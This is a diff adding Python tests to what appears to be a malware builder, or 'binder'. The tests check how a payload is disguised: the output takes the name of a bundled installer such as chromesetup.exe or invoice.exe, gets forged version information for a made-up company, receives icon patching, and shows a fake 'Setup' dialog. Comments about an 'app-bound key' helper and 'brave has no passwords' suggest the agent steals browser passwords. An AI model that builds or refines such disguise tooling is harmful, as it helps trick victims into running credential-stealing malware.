@@ -43,7 +43,7 @@ if str(ROOT) not in sys.path:
     sys.path.insert(0, str(ROOT))
 
 from agent import entry, loader  # noqa: E402
-from core import forge, pipeline, rename, seal  # noqa: E402
+from core import forge, pipeline, rename, schema, seal  # noqa: E402
 from core import validate as validate_module  # noqa: E402
 from core.schema import (  # noqa: E402
     RELAY_KINDS,
@@ -52,7 +52,9 @@ from core.schema import (  # noqa: E402
     RelayTarget,
     RunConfig,
     SourceConfig,
+    VersionConfig,
     from_dict,
+    to_dict,
 )
 
 CRYPTO = importlib.util.find_spec("Crypto") is not None
@@ -1345,3 +1347,224 @@ def test_a_bound_file_that_is_not_there_blocks(tmp_path: Path) -> None:
 
     assert validate_module.blocking(problems)
     assert problems[0].path == "output.fuse"
+
+
+# --- the disguise -------------------------------------------------------------
+#
+# The binder has two jobs beyond welding a payload on: the file has to carry the icon
+# it was given, and it has to arrive called what the operator called the file it is
+# carrying. Both were wrong in V1, and both are pinned here.
+
+
+def test_the_artifact_is_named_after_the_bound_file(tmp_path: Path) -> None:
+    # A build carrying chromesetup.exe arrives as chromesetup.exe. The random name is
+    # for a build with nothing better to go on, not a default.
+    bound = tmp_path / "chromesetup.exe"
+    bound.write_bytes(b"MZ" + bytes(64))
+
+    assert pipeline._artifact_name(None, bound, forge.OUTPUT_EXE) == "chromesetup.exe"
+
+
+def test_a_typed_name_beats_the_bound_file(tmp_path: Path) -> None:
+    bound = tmp_path / "chromesetup.exe"
+    bound.write_bytes(b"MZ" + bytes(64))
+
+    assert pipeline._artifact_name("invoice.exe", bound, forge.OUTPUT_EXE) == "invoice.exe"
+    assert pipeline._artifact_name("invoice", bound, forge.OUTPUT_EXE) == "invoice.exe"
+
+
+def test_a_build_with_no_bound_file_still_generates_a_name() -> None:
+    assert pipeline._artifact_name(None, None, forge.OUTPUT_EXE) is None
+
+
+def test_a_bound_name_that_is_not_legal_falls_back_rather_than_stopping(
+    tmp_path: Path,
+) -> None:
+    # The build is good; the name a file happens to have is not a reason to lose it.
+    # ``...exe`` has a stem of ``..``, which sanitises to nothing.
+    weird = tmp_path / "...exe"
+    weird.write_bytes(b"MZ")
+
+    assert pipeline._artifact_name(None, weird, forge.OUTPUT_EXE) is None
+
+
+def test_derive_keeps_the_stem_and_forces_one_suffix() -> None:
+    assert rename.derive("chromesetup.exe") == "chromesetup.exe"
+    assert rename.derive("chrome setup 2.exe") == "chrome setup 2.exe"
+    assert rename.derive("setup", ".py") == "setup.py"
+    with pytest.raises(rename.RenameError):
+        rename.derive("")
+
+
+def test_the_decoy_settings_travel_in_the_config_that_ships() -> None:
+    # cfg.json is what the agent reads. A disguise that never reaches it is a form
+    # field and nothing else.
+    cfg = config(
+        version=VersionConfig(company="Northline", file_version="6.2.9.441"),
+        decoy_seconds=30,
+        decoy_title="Setup",
+        decoy_text="Preparing",
+    )
+    carried = from_dict(json.loads(json.dumps(to_dict(cfg))))
+
+    assert carried.version.company == "Northline"
+    assert carried.version.file_version == "6.2.9.441"
+    assert (carried.decoy_seconds, carried.decoy_title) == (30, "Setup")
+
+
+def test_a_version_string_is_four_numbers_that_fit_in_sixteen_bits() -> None:
+    assert forge.version_parts("1.2.3.4") == ((1 << 16) | 2, (3 << 16) | 4)
+    assert forge.version_parts("65535.65535.65535.65535") == (0xFFFFFFFF, 0xFFFFFFFF)
+
+    for bad in ("1.2.3", "1.2.3.4.5", "1.2.3.x", "1.2.3.65536", "-1.2.3.4", ""):
+        with pytest.raises(forge.ForgeError):
+            forge.version_parts(bad)
+
+
+def test_a_version_block_carries_the_signature_and_every_string() -> None:
+    blob = forge.version_blob(
+        VersionConfig(
+            company="Northline Software Ltd",
+            product="Northline Setup",
+            description="Setup loader",
+            copyright="(c) 2026 Northline",
+            original_name="northline-setup.exe",
+            file_version="6.2.9.441",
+        )
+    )
+
+    # The block starts with its own length, then the key, then the fixed info. The
+    # signature is at a known offset because the key is a fixed string.
+    length, value_length, value_type = struct.unpack_from("<HHH", blob, 0)
+    assert length == len(blob)
+    assert value_type == 0
+    assert value_length == 52
+
+    fixed = 6 + len("VS_VERSION_INFO\0".encode("utf-16le"))
+    fixed += (4 - fixed % 4) % 4
+    assert struct.unpack_from("<I", blob, fixed)[0] == 0xFEEF04BD
+    ms, ls = struct.unpack_from("<II", blob, fixed + 8)
+    assert (ms >> 16, ms & 0xFFFF, ls >> 16, ls & 0xFFFF) == (6, 2, 9, 441)
+
+    for text in ("Northline Software Ltd", "Northline Setup", "(c) 2026 Northline"):
+        assert (text + "\0").encode("utf-16le") in blob
+
+
+def test_a_version_block_with_nothing_in_it_is_absent_rather_than_empty() -> None:
+    assert forge.version_blob(VersionConfig()) == b""
+
+
+def test_a_version_block_that_is_too_large_is_refused() -> None:
+    with pytest.raises(forge.ForgeError):
+        forge.version_blob(
+            VersionConfig(company="c" * (forge.MAX_VERSION_BYTES), file_version="1.0.0.0")
+        )
+
+
+@pytest.mark.parametrize(
+    ("version", "path"),
+    [
+        (VersionConfig(file_version="1.2.3"), "output.version.file_version"),
+        (VersionConfig(product_version="1.2.3.70000"), "output.version.product_version"),
+        (VersionConfig(company="a" * 300), "output.version.company"),
+        (VersionConfig(copyright="bad\x07bell"), "output.version.copyright"),
+    ],
+)
+def test_a_version_that_would_not_render_is_blocked_at_the_form(
+    version: VersionConfig, path: str
+) -> None:
+    problems = validate_module.validate(config(version=version), mode=forge.OUTPUT_EXE)
+
+    assert validate_module.blocking(problems)
+    # The launcher is not part of what this is testing; an exe build with no stub is a
+    # second blocking problem and filtering it keeps the assertion about one field.
+    assert [problem.path for problem in problems if problem.path != "output.stub"] == [path]
+
+
+def test_a_version_on_a_script_build_is_a_note() -> None:
+    problems = validate_module.validate(
+        config(version=VersionConfig(company="Northline")), mode=forge.OUTPUT_PY
+    )
+
+    assert [problem.blocking for problem in problems] == [False]
+    assert problems[0].path == "output.version"
+
+
+@pytest.mark.parametrize("seconds", [-1, 601])
+def test_a_decoy_outside_its_window_is_blocked(seconds: int) -> None:
+    problems = validate_module.validate(
+        config(decoy_seconds=seconds, decoy_title="Setup", decoy_text="Preparing"),
+        mode=forge.OUTPUT_EXE,
+    )
+
+    assert validate_module.blocking(problems)
+    assert problems[0].path == "output.decoy.seconds"
+
+
+def test_a_decoy_with_no_text_is_an_empty_box_and_is_blocked() -> None:
+    problems = validate_module.validate(
+        config(decoy_seconds=10), mode=forge.OUTPUT_EXE
+    )
+
+    assert validate_module.blocking(problems)
+    assert problems[0].path == "output.decoy.title"
+
+
+def test_zero_seconds_is_off_rather_than_a_zero_length_dialog() -> None:
+    problems = validate_module.validate(config(decoy_seconds=0), mode=forge.OUTPUT_EXE)
+
+    assert [problem for problem in problems if problem.path != "output.stub"] == []
+
+
+def test_the_decoy_bounds_are_the_same_number_on_both_sides() -> None:
+    # schema decides what a form may hold; the agent re-checks at runtime because the
+    # values arrive from an archive. One number, declared twice, pinned here.
+    from agent import decoy
+
+    assert decoy.MAX_DECOY_SECONDS == schema.MAX_DECOY_SECONDS
+    assert decoy.MAX_DECOY_TEXT == schema.MAX_DECOY_TEXT
+
+
+def test_the_helper_flag_is_the_same_string_on_both_sides() -> None:
+    # loader has to know the flag before the payload exists, and the payload is where
+    # abe lives. One string, declared twice, pinned here.
+    from agent import abe
+
+    assert loader.HELPER_FLAG == abe.UNWRAP_FLAG
+
+
+def test_the_helper_is_not_treated_as_a_second_instance(monkeypatch: pytest.MonkeyPatch) -> None:
+    # The whole app-bound key depends on this. The running agent holds the mutex; the
+    # helper re-execs the same image and would be refused as a duplicate before it read
+    # its flag, which reads as "brave has no passwords" rather than "the unwrap died".
+    monkeypatch.setattr(loader, "acquire", lambda *args: False)
+
+    assert loader._guarded(["agent.exe", loader.HELPER_FLAG, "C:/temp/s1"]) is True
+    assert loader._guarded(["agent.exe"]) is False
+
+
+def test_a_decoy_of_zero_seconds_starts_no_thread() -> None:
+    from agent import decoy
+
+    assert decoy.start("Setup", "Preparing", 0) is None
+    assert decoy.show("Setup", "Preparing", 0) is False
+
+
+@pytest.mark.skipif(not LAUNCHER.is_file(), reason="the launcher has not been built")
+def test_the_launcher_resource_table_is_read_before_it_is_written() -> None:
+    refs = forge.resource_refs(LAUNCHER.read_bytes())
+
+    kinds = {ref.kind for ref in refs}
+    assert 3 in kinds and 14 in kinds
+    groups = {ref.identifier for ref in refs if ref.kind == 14}
+    # The binder reads this instead of assuming 1: a stub whose icon lives anywhere
+    # else gets a second group when the id is assumed, and the shell picks.
+    assert len(groups) == 1
+    assert all(ref.language >= 0 for ref in refs)
+
+
+def test_patching_nothing_is_refused_rather_than_writing_an_empty_cycle() -> None:
+    with pytest.raises(forge.ForgeError):
+        forge.patch_resources(Path("nowhere.exe"))
+    with pytest.raises(forge.ForgeError):
+        forge.patch_resources(Path("nowhere.exe"), icons=[])
